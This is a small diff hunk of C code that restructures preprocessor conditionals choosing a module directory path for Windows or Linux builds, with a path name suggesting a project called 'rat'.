@@ -30,9 +30,10 @@ int main(void) {
 
 #ifdef _WIN32
 	char *mod_path = "C:\\Users\\User\\";
-#endif
+#else
 #ifdef linux
 	char *mod_path = "/home/venus/projects/rat/modules/";
+#endif
 #endif
 
 	char *mods[] = {
